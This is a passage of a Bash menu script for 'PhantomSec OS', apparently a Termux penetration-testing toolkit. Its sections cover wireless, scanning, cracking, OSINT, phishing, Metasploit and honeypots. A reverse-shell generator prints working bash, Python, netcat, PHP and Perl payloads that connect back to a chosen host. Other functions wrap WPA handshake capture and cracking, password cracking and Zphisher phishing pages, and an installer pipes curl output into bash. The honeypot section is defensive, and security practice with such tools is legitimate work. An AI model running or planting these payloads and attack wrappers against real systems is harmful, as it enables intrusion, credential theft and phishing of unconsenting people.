# ── 06  Wireless ───────────────────────────────────────────────────────
menu_wireless() {
  while true; do
    show_banner; draw_box "  📱 WIRELESS INFO" 66; echo ""
    echo -e "  ${Y}[!] Note: Full wireless attacks require root + monitor-mode adapter.${NC}"
    echo -e "  ${Y}[!] Some features may be limited in Termux without root.${NC}"; echo ""
    echo -e "  ${W}Available info commands:${NC}"
    echo -e "  ${DC}[1]${NC} Show WiFi info (termux-wifi-connectioninfo)"
    echo -e "  ${DC}[2]${NC} Scan nearby WiFi (termux-wifi-scaninfo)"
    echo -e "  ${DC}[3]${NC} Aircrack-ng — Capture handshake          $(tool_status aircrack-ng)"
    echo -e "  ${DC}[4]${NC} Aircrack-ng — Crack WPA handshake        $(tool_status aircrack-ng)"
    echo -e "  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r r
    case "$r" in
      1) termux-wifi-connectioninfo 2>/dev/null | python3 -m json.tool 2>/dev/null; press_enter ;;
      2) termux-wifi-scaninfo 2>/dev/null | python3 -m json.tool 2>/dev/null | head -60; press_enter ;;
      3) run_aircrack_capture ;;
      4) run_aircrack_crack ;;
      0) return ;;
      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
    esac
  done
}

# ── 07  Reverse Shells ─────────────────────────────────────────────────
menu_shells() {
  show_banner; draw_box "  🐚 REVERSE SHELL GENERATOR" 66; echo ""
  echo -ne "  ${C}Your IP (listener):${NC} "; read -r ip
  echo -ne "  ${C}Port:${NC} "; read -r port
  echo ""; draw_line "─" 66
  echo -e "${G}[+] Bash:${NC}"
  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo -e "\n${G}[+] Python3:${NC}"
  echo "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""
  echo -e "\n${G}[+] Netcat:${NC}"
  echo "nc -e /bin/bash $ip $port"
  echo -e "\n${G}[+] PHP:${NC}"
  echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\"); ?>"
  echo -e "\n${G}[+] Perl:${NC}"
  echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
  echo -e "\n${G}[+] Start listener:${NC}  nc -lvnp $port"
  draw_line "─" 66; press_enter
}

# ── 08  Forensics ──────────────────────────────────────────────────────
menu_forensics() {
  while true; do
    show_banner; draw_box "  🛡️  FORENSICS & ANALYSIS" 66; echo ""
    echo -e "  ${DC}[1]${NC} ${W}File metadata (strings)${NC}"
    echo -e "  ${DC}[2]${NC} ${W}MD5 / SHA256 Checksum${NC}"
    echo -e "  ${DC}[3]${NC} ${W}Hex dump${NC}"
    echo -e "  ${DC}[4]${NC} ${W}Base64 encode/decode${NC}"
    echo -e "  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r r
    case "$r" in
      1) echo -ne "  File: "; read -r f; strings "$f" | head -50; press_enter ;;
      2) echo -ne "  File: "; read -r f
         echo -e "${G}MD5:${NC}    $(md5sum "$f" | cut -d' ' -f1)"
         echo -e "${G}SHA256:${NC} $(sha256sum "$f" | cut -d' ' -f1)"; press_enter ;;
      3) echo -ne "  File: "; read -r f; xxd "$f" | head -20; press_enter ;;
      4) echo -e "  ${DC}[1]${NC} Encode  ${DC}[2]${NC} Decode"; read -r m
         echo -ne "  String: "; read -r s
         case "$m" in 1) echo "$s" | base64;; 2) echo "$s" | base64 -d;; esac; press_enter ;;
      0) return ;;
      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
    esac
  done
}

# ── 09  Cryptography ───────────────────────────────────────────────────
menu_crypto() {
  while true; do
    show_banner; draw_box "  🔐 CRYPTOGRAPHY TOOLS" 66; echo ""
    echo -e "  ${DC}[1]${NC} ${W}Generate RSA key pair${NC}"
    echo -e "  ${DC}[2]${NC} ${W}Hash string (MD5/SHA)${NC}"
    echo -e "  ${DC}[3]${NC} ${W}Caesar cipher${NC}"
    echo -e "  ${DC}[4]${NC} ${W}ROT13${NC}"
    echo -e "  ${DC}[5]${NC} ${W}Generate random token${NC}"
    echo -e "  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r r
    case "$r" in
      1) openssl genrsa -out "$PHANTOMSEC_DIR/key.pem" 2048 2>/dev/null
         openssl rsa -in "$PHANTOMSEC_DIR/key.pem" -pubout -out "$PHANTOMSEC_DIR/key.pub" 2>/dev/null
         echo -e "  ${G}[✓] Saved to $PHANTOMSEC_DIR/key.pem & key.pub${NC}"; press_enter ;;
      2) echo -ne "  String: "; read -r s
         echo -e "  ${G}MD5:${NC}    $(echo -n "$s" | md5sum | cut -d' ' -f1)"
         echo -e "  ${G}SHA1:${NC}   $(echo -n "$s" | sha1sum | cut -d' ' -f1)"
         echo -e "  ${G}SHA256:${NC} $(echo -n "$s" | sha256sum | cut -d' ' -f1)"; press_enter ;;
      3) echo -ne "  Text: "; read -r t; echo -ne "  Shift (1-25): "; read -r sh
         sh="${sh:-13}"
         if ! [[ "$sh" =~ ^[0-9]+$ ]]; then echo -e "  ${R}[x] Shift must be a number.${NC}"; press_enter; continue; fi
         echo "$t" | python3 -c "
import sys, string
sh=int('$sh') % 26
t=sys.stdin.read().rstrip()
out=''
for c in t:
    if c in string.ascii_uppercase: out+=string.ascii_uppercase[(string.ascii_uppercase.index(c)+sh)%26]
    elif c in string.ascii_lowercase: out+=string.ascii_lowercase[(string.ascii_lowercase.index(c)+sh)%26]
    else: out+=c
print(out)"; press_enter ;;
      4) echo -ne "  Text: "; read -r t; echo "$t" | tr 'A-Za-z' 'N-ZA-Mn-za-m'; press_enter ;;
      5) openssl rand -hex 32; press_enter ;;
      0) return ;;
      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
    esac
  done
}

# ── 10  Tool Manager ───────────────────────────────────────────────────
menu_tool_manager() {
  while true; do
    show_banner; draw_box "  📦 TOOL MANAGER" 66; echo -e "${M}${V}${NC}"
    echo -e "${M}${V}${NC}  ${DC}[1]${NC}  ${W}Check installed tools${NC}"
    echo -e "${M}${V}${NC}  ${DC}[2]${NC}  ${W}Update all packages${NC}"
    echo -e "${M}${V}${NC}  ${DC}[3]${NC}  ${W}Install missing tools${NC}"
    echo -e "${M}${V}${NC}  ${DC}[4]${NC}  ${W}Update PhantomSec${NC}"
    echo -e "${M}${V}${NC}  ${DC}[5]${NC}  ${W}Check for Updates${NC}         ${DIM}(compare with GitHub)${NC}"
    echo -e "${M}${V}${NC}"; echo -e "${M}${V}${NC}  ${Y}[0]${NC}  Back"; echo -e "${M}${V}${NC}"
    draw_box_bottom 66
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      5) show_banner; draw_box "  CHECK FOR UPDATES" 66; echo ""
         local remote_ver local_ver
         local_ver="$(cat "$_VERSION_FILE" 2>/dev/null | tr -d '[:space:]' || echo "$VERSION")"
         echo -e "  ${C}[*] Checking GitHub for latest version...${NC}"
         remote_ver=$(curl -s --max-time 8 \
           "https://raw.githubusercontent.com/wippsanrinthailand80-commits/distro-os-cyber-agian-on-termux/main/VERSION" \
           2>/dev/null | tr -d '[:space:]')
         if [ -z "$remote_ver" ]; then
           echo -e "  ${Y}[!] Could not reach GitHub. Check your internet connection.${NC}"
         elif [ "$remote_ver" = "$local_ver" ]; then
           echo -e "  ${G}[V] You are up to date! (v$local_ver)${NC}"
         else
           echo -e "  ${Y}[!] Update available! v$remote_ver (you have v$local_ver)${NC}"
           echo -e "  ${C}    Run option [4] Update PhantomSec to upgrade.${NC}"
         fi
         press_enter ;;
      1)
        show_banner; draw_box "  TOOL STATUS" 66; echo ""
        local tools=("nmap" "sqlmap" "hydra" "nikto" "curl" "wget" "git" "python3" "openssl" "nc" "dig" "whois" "masscan" "john" "gobuster" "nuclei" "whatweb" "aircrack-ng")
        for t in "${tools[@]}"; do
          printf "  %-20s" "$t"
          tool_status "$t"
        done; press_enter ;;
      2) pkg update -y && pkg upgrade -y; echo -e "\n  ${G}[✓] Updated${NC}"; press_enter ;;
      3) pkg install -y nmap hydra sqlmap nikto curl wget git openssl-tool masscan aircrack-ng
         pip install theHarvester nuclei 2>/dev/null || true
         pkg install -y golang 2>/dev/null && go install github.com/OJ/gobuster/v3@latest 2>/dev/null || true
         bash -c 'curl -fsSL https://projectdiscovery.io/nuclei.sh | bash' 2>/dev/null || true
         echo -e "\n  ${G}[✓] Done${NC}"; press_enter ;;
      4) local _upd_script=""
         for _loc in "$_SCRIPT_DIR/update.sh" \
                     "$HOME/distro-os-cyber-agian-on-termux/update.sh" \
                     "$HOME/phantomsec/update.sh" \
                     "$HOME/PhantomSec/update.sh"; do
           [ -f "$_loc" ] && _upd_script="$_loc" && break
         done
         if [ -n "$_upd_script" ]; then
           bash "$_upd_script"
         else
           echo -e "  ${R}[x] update.sh not found. Clone the repo first:${NC}"
           echo -e "  ${C}git clone https://github.com/wippsanrinthailand80-commits/distro-os-cyber-agian-on-termux${NC}"
         fi
         press_enter ;;
      0) return ;;
    esac
  done
}

# ── 11  Sessions ───────────────────────────────────────────────────────
menu_sessions() {
  while true; do
    show_banner; draw_box "  📊 SESSIONS & REPORTS" 66; echo ""
    echo -e "  ${W}Session logs:${NC}"; echo ""
    ls -lht "$PHANTOMSEC_DIR/logs/" 2>/dev/null | head -10 || echo "  (no logs)"
    echo ""; echo -e "  ${W}Reports:${NC}"; echo ""
    ls -lht "$PHANTOMSEC_DIR/reports/" 2>/dev/null | head -10 || echo "  (no reports)"
    echo ""
    echo -e "  ${DC}[1]${NC} View a log file  ${DC}[2]${NC} Clear all logs  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r r
    case "$r" in
      1) echo -ne "  Filename: "; read -r f; cat "$PHANTOMSEC_DIR/logs/$f" 2>/dev/null; press_enter ;;
      2) rm -f "$PHANTOMSEC_DIR/logs/"* "$PHANTOMSEC_DIR/reports/"*; echo -e "  ${G}[✓] Cleared${NC}"; press_enter ;;
      0) return ;;
    esac
  done
}

# ── 12  Settings ───────────────────────────────────────────────────────
menu_settings() {
  while true; do
    show_banner; draw_box "  ⚙️  SETTINGS" 66; echo ""
    echo -e "  ${DC}[1]${NC} ${W}View config${NC}              ${DC}[2]${NC} ${W}Set Shodan API key${NC}"
    echo -e "  ${DC}[3]${NC} ${W}Change shell (zsh/bash)${NC}  ${DC}[4]${NC} ${W}About PhantomSec${NC}"
    echo -e "  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r r
    case "$r" in
      1) mkdir -p "$PHANTOMSEC_DIR/config"
         cat "$PHANTOMSEC_DIR/config/settings.conf" 2>/dev/null || echo "  (no config found at $PHANTOMSEC_DIR/config/settings.conf)"; press_enter ;;
      2) echo -ne "  ${C}Shodan API key:${NC} "; read -rs k; echo ""
         local cfg="$PHANTOMSEC_DIR/config/settings.conf"
         if grep -q "^SHODAN_API_KEY=" "$cfg" 2>/dev/null; then
           sed -i "s|^SHODAN_API_KEY=.*|SHODAN_API_KEY=\"$k\"|" "$cfg"
         else
           echo "SHODAN_API_KEY=\"$k\"" >> "$cfg"
         fi
         echo -e "  ${G}[✓] Saved${NC}"; press_enter ;;
      3) chsh -s "$(which zsh)" 2>/dev/null && echo -e "  ${G}[✓] Shell changed to zsh${NC}"; press_enter ;;
      4) show_about; press_enter ;;
      0) return ;;
    esac
  done
}

show_about() {
  show_banner
  draw_box "  ABOUT PHANTOMSEC" 66; echo ""
  echo -e "  ${W}Name:${NC}       PhantomSec OS"
  echo -e "  ${W}Version:${NC}    $VERSION"
  echo -e "  ${W}Platform:${NC}   Android / Termux"
  echo -e "  ${W}Purpose:${NC}    Cybersecurity research & education"
  echo -e "  ${W}License:${NC}    MIT"
  echo -e "  ${W}GitHub:${NC}     github.com/wippsanrinthailand80-commits"
  echo ""
  echo -e "  ${Y}[!] For educational and ethical use only.${NC}"
  echo -e "  ${Y}[!] The authors are not responsible for misuse.${NC}"
}

exit_phantom() {
  show_banner
  echo -e "  ${M}${BOLD}Thanks for using PhantomSec OS!${NC}"
  echo -e "  ${DIM}Stay ethical. Stay sharp.${NC}"
  echo ""
  exit 0
}


# ── New Tools ──────────────────────────────────────────────────────────

run_whatweb() {
  show_banner; draw_box "  WHATWEB FINGERPRINT" 66; echo ""
  echo -ne "  ${C}Target URL (e.g. https://example.com):${NC} "; read -r url
  echo ""; draw_line "─" 66
  if command -v whatweb &>/dev/null; then
    whatweb -a 3 "$url" 2>&1 | tee "$PHANTOMSEC_DIR/reports/whatweb_$(date +%s).txt"
  else
    echo -e "  ${Y}[!] WhatWeb not installed. Install with: pip install whatweb${NC}"
    echo -e "  ${C}[*] Fallback: curl fingerprint${NC}"; echo ""
    curl -sI "$url" 2>/dev/null | grep -iE "server:|x-powered-by:|x-generator:|via:"
  fi
  draw_line "─" 66; press_enter
}

run_harvester() {
  show_banner; draw_box "  THEHARVESTER — OSINT" 66; echo ""
  echo -ne "  ${C}Target domain (e.g. example.com):${NC} "; read -r domain
  echo -e "
  ${W}Data source:${NC}"
  echo -e "  ${DC}[1]${NC} Google  ${DC}[2]${NC} Bing  ${DC}[3]${NC} DuckDuckGo  ${DC}[4]${NC} All"
  echo -ne "
  ${M}▶${NC} "; read -r src
  local source
  case "$src" in 1) source="google";; 2) source="bing";; 3) source="duckduckgo";; *) source="all";; esac
  echo ""; draw_line "─" 66
  if command -v theHarvester &>/dev/null; then
    theHarvester -d "$domain" -b "$source" 2>&1 | tee "$PHANTOMSEC_DIR/reports/harvester_$(date +%s).txt"
  else
    echo -e "  ${Y}[!] theHarvester not installed.${NC}"
    echo -e "  ${C}Install: pip install theHarvester${NC}"
    echo -e "
  ${C}[*] Quick OSINT via cert transparency:${NC}"
    curl -s "https://crt.sh/?q=%25.${domain}&output=json" 2>/dev/null \
      | grep -o '"name_value":"[^"]*"' | sort -u | sed 's/"name_value":"//;s/"//' | head -30
  fi
  draw_line "─" 66; press_enter
}

run_nuclei() {
  show_banner; draw_box "  NUCLEI SCANNER" 66; echo ""
  echo -ne "  ${C}Target URL:${NC} "; read -r url
  echo -e "
  ${W}Severity:${NC}"
  echo -e "  ${DC}[1]${NC} Critical+High  ${DC}[2]${NC} All  ${DC}[3]${NC} Tech detection only"
  echo -ne "
  ${M}▶${NC} "; read -r sv
  echo ""; draw_line "─" 66
  if command -v nuclei &>/dev/null; then
    case "$sv" in
      1) nuclei -u "$url" -severity critical,high 2>&1 | tee "$PHANTOMSEC_DIR/reports/nuclei_$(date +%s).txt" ;;
      3) nuclei -u "$url" -tags tech 2>&1 | tee "$PHANTOMSEC_DIR/reports/nuclei_tech_$(date +%s).txt" ;;
      *) nuclei -u "$url" 2>&1 | tee "$PHANTOMSEC_DIR/reports/nuclei_$(date +%s).txt" ;;
    esac
  else
    echo -e "  ${Y}[!] Nuclei not installed.${NC}"
    echo -e "  ${C}Install: bash -c \$(curl -fsSL https://projectdiscovery.io/nuclei.sh)${NC}"
  fi
  draw_line "─" 66; press_enter
}

run_gobuster() {
  show_banner; draw_box "  GOBUSTER DIR SCAN" 66; echo ""
  echo -ne "  ${C}Target URL (e.g. http://site.com):${NC} "; read -r url
  echo -ne "  ${C}Wordlist [Enter for built-in small list]:${NC} "; read -r wl
  echo -e "
  ${W}Mode:${NC}"
  echo -e "  ${DC}[1]${NC} Directory  ${DC}[2]${NC} DNS subdomain  ${DC}[3]${NC} Virtual host"
  echo -ne "
  ${M}▶${NC} "; read -r mode
  echo ""; draw_line "─" 66
  if command -v gobuster &>/dev/null; then
    local list="${wl:-$PHANTOMSEC_DIR/wordlists/common.txt}"
    # create a small built-in list if none exists
    if [ ! -f "$list" ]; then
      list="/tmp/ps_dirs.txt"
      printf '%s
' admin login dashboard wp-admin phpmyadmin backup config api uploads .git .env robots.txt console panel secret test dev old assets static media files > "$list"
    fi
    case "$mode" in
      2) gobuster dns -d "$url" -w "$list" 2>&1 | tee "$PHANTOMSEC_DIR/reports/gobuster_$(date +%s).txt" ;;
      3) gobuster vhost -u "$url" -w "$list" 2>&1 | tee "$PHANTOMSEC_DIR/reports/gobuster_$(date +%s).txt" ;;
      *) gobuster dir -u "$url" -w "$list" -t 20 2>&1 | tee "$PHANTOMSEC_DIR/reports/gobuster_$(date +%s).txt" ;;
    esac
  else
    echo -e "  ${Y}[!] Gobuster not installed. Running built-in curl scan instead...${NC}"; echo ""
    local dirs=(admin login dashboard wp-admin phpmyadmin backup config api uploads .git .env robots.txt console panel secret test dev old)
    for d in "${dirs[@]}"; do
      local code; code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url/$d" 2>/dev/null)
      case "$code" in
        200) echo -e "  ${G}[200 FOUND ]${NC}  $url/$d" ;;
        301|302) echo -e "  ${Y}[${code} REDIR]${NC}  $url/$d" ;;
        403) echo -e "  ${DC}[403 FORBID]${NC}  $url/$d" ;;
      esac
    done
    echo -e "
  ${C}Install Gobuster: go install github.com/OJ/gobuster/v3@latest${NC}"
  fi
  draw_line "─" 66; press_enter
}

run_john() {
  show_banner; draw_box "  JOHN THE RIPPER" 66; echo ""
  if ! command -v john &>/dev/null; then
    echo -e "  ${Y}[!] John not installed.${NC}"
    echo -e "  ${C}Install: pkg install john${NC}"; press_enter; return
  fi
  echo -e "  ${W}Mode:${NC}"
  echo -e "  ${DC}[1]${NC} Crack hash file (wordlist attack)"
  echo -e "  ${DC}[2]${NC} Crack hash file (incremental)"
  echo -e "  ${DC}[3]${NC} Show cracked passwords"
  echo -ne "
  ${M}▶${NC} "; read -r m
  echo -ne "  ${C}Hash file path:${NC} "; read -r hfile
  echo ""; draw_line "─" 66
  case "$m" in
    1) echo -ne "  ${C}Wordlist [default rockyou]:${NC} "; read -r wl
       wl="${wl:-$PHANTOMSEC_DIR/wordlists/common-passwords.txt}"
       john --wordlist="$wl" "$hfile" 2>&1 | tee "$PHANTOMSEC_DIR/reports/john_$(date +%s).txt" ;;
    2) john --incremental "$hfile" 2>&1 | tee "$PHANTOMSEC_DIR/reports/john_$(date +%s).txt" ;;
    3) john --show "$hfile" 2>&1 ;;
  esac
  draw_line "─" 66; press_enter
}

run_masscan() {
  show_banner; draw_box "  MASSCAN FAST PORT SCAN" 66; echo ""
  if ! command -v masscan &>/dev/null; then
    echo -e "  ${Y}[!] Masscan not installed.${NC}"
    echo -e "  ${C}Install: pkg install masscan${NC}"; press_enter; return
  fi
  echo -e "  ${Y}[!] Masscan may require root for raw sockets on some systems.${NC}"; echo ""
  echo -ne "  ${C}Target IP/range (e.g. 192.168.1.0/24):${NC} "; read -r target
  echo -ne "  ${C}Port range [default 1-10000]:${NC} "; read -r ports
  ports="${ports:-1-10000}"
  echo -ne "  ${C}Rate (packets/sec) [default 1000]:${NC} "; read -r rate
  rate="${rate:-1000}"
  echo ""; draw_line "─" 66
  masscan "$target" -p"$ports" --rate="$rate" 2>&1 | tee "$PHANTOMSEC_DIR/reports/masscan_$(date +%s).txt"
  draw_line "─" 66; press_enter
}

run_aircrack_capture() {
  show_banner; draw_box "  AIRCRACK — CAPTURE HANDSHAKE" 66; echo ""
  echo -e "  ${Y}[!] Requires root and a WiFi adapter that supports monitor mode.${NC}"
  echo -e "  ${Y}[!] Not supported on most Android devices without root.${NC}"; echo ""
  if ! command -v aircrack-ng &>/dev/null; then
    echo -e "  ${R}[✗] aircrack-ng not installed.${NC}"
    echo -e "  ${C}Install: pkg install aircrack-ng${NC}"; press_enter; return
  fi
  echo -ne "  ${C}Interface (e.g. wlan0):${NC} "; read -r iface
  echo -ne "  ${C}BSSID (target AP MAC):${NC} "; read -r bssid
  echo -ne "  ${C}Channel:${NC} "; read -r ch
  echo -ne "  ${C}Output file prefix:${NC} "; read -r outf
  outf="${outf:-$PHANTOMSEC_DIR/reports/capture}"
  echo ""; draw_line "─" 66
  echo -e "  ${C}[*] Setting monitor mode on $iface ...${NC}"
  airmon-ng start "$iface" 2>&1 | tail -3
  echo -e "  ${C}[*] Capturing on $iface — press Ctrl+C to stop${NC}"
  airodump-ng --bssid "$bssid" -c "$ch" -w "$outf" "${iface}mon" 2>&1
  draw_line "─" 66; press_enter
}

run_aircrack_crack() {
  show_banner; draw_box "  AIRCRACK — CRACK WPA HANDSHAKE" 66; echo ""
  if ! command -v aircrack-ng &>/dev/null; then
    echo -e "  ${R}[✗] aircrack-ng not installed. Run: pkg install aircrack-ng${NC}"; press_enter; return
  fi
  echo -ne "  ${C}Capture file (.cap):${NC} "; read -r capfile
  echo -ne "  ${C}Wordlist path:${NC} "; read -r wl
  wl="${wl:-$PHANTOMSEC_DIR/wordlists/common-passwords.txt}"
  echo ""; draw_line "─" 66
  aircrack-ng -w "$wl" "$capfile" 2>&1 | tee "$PHANTOMSEC_DIR/reports/aircrack_$(date +%s).txt"
  draw_line "─" 66; press_enter
}

run_zphisher() {
  show_banner; draw_box "  ZPHISHER — PHISHING PAGES" 66; echo ""
  echo -e "  ${Y}[!] For authorized security awareness testing only.${NC}"; echo ""
  local zdir="$HOME/zphisher"
  if [ ! -d "$zdir" ]; then
    echo -e "  ${C}[*] Cloning Zphisher...${NC}"
    git clone https://github.com/htr-tech/zphisher.git "$zdir" 2>&1 | tail -3
  fi
  if [ -f "$zdir/zphisher.sh" ]; then
    echo -e "  ${G}[✓] Launching Zphisher...${NC}"; echo ""
    cd "$zdir" && bash zphisher.sh
  else
    echo -e "  ${R}[✗] Failed to set up Zphisher.${NC}"
    echo -e "  ${C}Manual: git clone https://github.com/htr-tech/zphisher && bash zphisher/zphisher.sh${NC}"
    press_enter
  fi
}

run_metasploit() {
  show_banner; draw_box "  METASPLOIT FRAMEWORK" 66; echo ""
  if command -v msfconsole &>/dev/null; then
    echo -e "  ${G}[✓] Metasploit found — launching msfconsole${NC}"; echo ""
    msfconsole
  elif [ -d "$HOME/metasploit-framework" ]; then
    echo -e "  ${G}[✓] Found at ~/metasploit-framework${NC}"
    cd "$HOME/metasploit-framework" && ruby msfconsole
  else
    echo -e "  ${Y}[!] Metasploit not installed.${NC}"; echo ""
    echo -e "  ${W}Install on Termux:${NC}"
    echo -e "  ${C}pkg install unstable-repo${NC}"
    echo -e "  ${C}pkg install metasploit${NC}"
    echo ""
    echo -ne "  ${C}Install now? (y/N):${NC} "; read -r ans
    if [ "$ans" = "y" ] || [ "$ans" = "Y" ]; then
      pkg install -y unstable-repo 2>&1
      pkg install -y metasploit 2>&1
    fi
    press_enter
  fi
}

# ── 13  Social Engineering ─────────────────────────────────────────────
menu_social() {
  while true; do
    show_banner; draw_box "  🎣 SOCIAL ENGINEERING" 66; echo ""
    echo -e "  ${Y}[!] For authorized security awareness testing only.${NC}"; echo ""
    echo -e "  ${DC}[1]${NC} ${W}Zphisher — Phishing Pages${NC}          ${DIM}(auto-clone)${NC}"
    echo -e "  ${DC}[2]${NC} ${W}Metasploit Framework${NC}              $(tool_status msfconsole)"
    echo -e "  ${DC}[3]${NC} ${W}SET Info${NC}                          ${DIM}(Social-Engineer Toolkit)${NC}"
    echo -e "  ${DC}[0]${NC} Back"
    echo -ne "
  ${M}▶${NC} "; read -r r
    case "$r" in
      1) run_zphisher ;;
      2) run_metasploit ;;
      3) show_banner; draw_box "  SOCIAL-ENGINEER TOOLKIT" 66; echo ""
         echo -e "  ${W}SET is a Python framework for social engineering attacks.${NC}"
         echo -e "  ${W}Install:${NC} pip install social-engineer-toolkit"
         echo -e "  ${W}Or:${NC}     git clone https://github.com/trustedsec/social-engineer-toolkit"
         echo -e "            cd social-engineer-toolkit && pip install -r requirements.txt"
         echo -e "            python setup.py"
         press_enter ;;
      0) return ;;
      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
    esac
  done
}

# ── 14  Honeypot ───────────────────────────────────────────────────────
HONEYPOT_LOG="$PHANTOMSEC_DIR/logs/honeypot.log"
HONEYPOT_PID_FILE="$PHANTOMSEC_DIR/honeypot.pid"

menu_honeypot() {
  while true; do
    show_banner; draw_box "  🍯 HONEYPOT" 66; echo ""
    echo -e "  ${Y}[!] Honeypot traps & logs unauthorised connection attempts.${NC}"
    echo -e "  ${Y}[!] For defensive / educational use on systems you own only.${NC}"; echo ""
    echo -e "  ${DC}[1]${NC}  ${W}Start TCP Honeypot${NC}          ${DIM}(fake listener — logs IPs)${NC}"
    echo -e "  ${DC}[2]${NC}  ${W}Start HTTP Honeypot${NC}         ${DIM}(fake web server — logs reqs)${NC}"
    echo -e "  ${DC}[3]${NC}  ${W}Multi-Port Honeypot${NC}         ${DIM}(SSH/FTP/Telnet decoys)${NC}"
    echo -e "  ${DC}[4]${NC}  ${W}View Honeypot Logs${NC}          ${DIM}($HONEYPOT_LOG)${NC}"
    echo -e "  ${DC}[5]${NC}  ${W}Stop All Honeypots${NC}"
    echo -e "  ${DC}[6]${NC}  ${W}Live Monitor${NC}                ${DIM}(tail -f log)${NC}"
    echo -e "  ${DC}[0]${NC}  Back"
    echo -ne "\n  ${M}▶${NC} ${W}Select:${NC} ${C}"; read -r r; echo -ne "${NC}"
    case "$r" in
      1) run_honeypot_tcp ;;
      2) run_honeypot_http ;;
      3) run_honeypot_multi ;;
      4) run_honeypot_viewlog ;;
      5) stop_all_honeypots ;;
      6) run_honeypot_monitor ;;
      0) return ;;
      *) echo -e "  ${R}Invalid option.${NC}"; sleep 1 ;;
    esac
  done
}

# ── Honeypot: helpers ──────────────────────────────────────────────────
_hp_log() {
  local tag="$1"; shift
  echo "[$(date '+%Y-%m-%d %T')] [$tag] $*" | tee -a "$HONEYPOT_LOG"
}

_hp_register_pid() {
  echo "$1" >> "$HONEYPOT_PID_FILE"
}

# ── Honeypot: TCP listener ─────────────────────────────────────────────
run_honeypot_tcp() {
  show_banner; draw_box "  🍯 TCP HONEYPOT" 66; echo ""
  if ! command -v nc &>/dev/null; then
    echo -e "  ${R}[✗] netcat (nc) not found. Install: pkg install netcat-openbsd${NC}"; press_enter; return
  fi
  echo -ne "  ${C}Port to listen on [default 2222]:${NC} "; read -r hport
  hport="${hport:-2222}"
  if ! [[ "$hport" =~ ^[0-9]+$ ]] || [ "$hport" -lt 1 ] || [ "$hport" -gt 65535 ]; then
    echo -e "  ${R}[✗] Invalid port.${NC}"; press_enter; return
  fi
  echo -ne "  ${C}Fake banner to show attackers [default: SSH-2.0-OpenSSH_8.9]:${NC} "; read -r banner
  banner="${banner:-SSH-2.0-OpenSSH_8.9}"

  echo ""
  echo -e "  ${G}[✓] Starting TCP honeypot on port ${hport}...${NC}"
  echo -e "  ${DIM}  Logging to: $HONEYPOT_LOG${NC}"
  echo -e "  ${DIM}  Press Ctrl+C to stop.${NC}"; echo ""
  _hp_log "TCP" "Honeypot started on port $hport with banner: $banner"

  while true; do
    local conn_info
    # nc accepts one connection, prints the client's data, then loops
    conn_info=$(echo -e "$banner\r\nConnection closed.\r\n" \
      | nc -l -p "$hport" -q 1 2>/dev/null)
    local src_ip
    # On Termux nc doesn't expose peer; log timestamp + any received data
    src_ip="unknown"
    _hp_log "TCP" "Connection on :$hport | peer=$src_ip | data=$(echo "$conn_info" | head -3 | tr '\n' '|')"
    echo -e "  ${G}[HIT]${NC}  $(date '+%T')  port=$hport  data=${conn_info:0:60}"
  done
  _hp_log "TCP" "Honeypot stopped on port $hport"
}

# ── Honeypot: HTTP listener ────────────────────────────────────────────
run_honeypot_http() {
  show_banner; draw_box "  🍯 HTTP HONEYPOT" 66; echo ""
  echo -ne "  ${C}Port to listen on [default 8080]:${NC} "; read -r hport
  hport="${hport:-8080}"
  if ! [[ "$hport" =~ ^[0-9]+$ ]] || [ "$hport" -lt 1 ] || [ "$hport" -gt 65535 ]; then
    echo -e "  ${R}[✗] Invalid port.${NC}"; press_enter; return
  fi

  echo ""
  echo -e "  ${G}[✓] Starting HTTP honeypot on port ${hport}...${NC}"
  echo -e "  ${DIM}  Logging to: $HONEYPOT_LOG${NC}"
  echo -e "  ${DIM}  Press Ctrl+C to stop.${NC}"; echo ""
  _hp_log "HTTP" "Honeypot started on port $hport"

  # Fake HTTP response that looks like a real Apache server
  local fake_response
  fake_response="HTTP/1.1 200 OK\r\nServer: Apache/2.4.54 (Debian)\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<html><body><h1>It works!</h1></body></html>\r\n"

  while true; do
    local request
    request=$(printf '%b' "$fake_response" | nc -l -p "$hport" -q 1 2>/dev/null)
    local req_line uri method
    req_line=$(echo "$request" | head -1)
    method=$(echo "$req_line" | awk '{print $1}')
    uri=$(echo "$req_line" | awk '{print $2}')
    _hp_log "HTTP" "Hit on :$hport | method=$method uri=$uri | raw=$(echo "$request" | head -3 | tr '\n' '|')"
    echo -e "  ${G}[HIT]${NC}  $(date '+%T')  $method $uri"
  done
  _hp_log "HTTP" "Honeypot stopped on port $hport"
}

# ── Honeypot: Multi-port decoys ────────────────────────────────────────
run_honeypot_multi() {
  show_banner; draw_box "  🍯 MULTI-PORT HONEYPOT" 66; echo ""
  echo -e "  ${W}Decoy ports:${NC}"
  echo -e "  ${DC}22${NC}   — Fake SSH     ${DC}21${NC}   — Fake FTP"
  echo -e "  ${DC}23${NC}   — Fake Telnet  ${DC}3306${NC} — Fake MySQL"
  echo -e "  ${DC}8080${NC} — Fake HTTP    ${DC}4444${NC} — Generic trap"
  echo ""
  echo -ne "  ${C}Ports (space-separated) [default: 2222 2121 2323 8080 4444]:${NC} "; read -r port_input
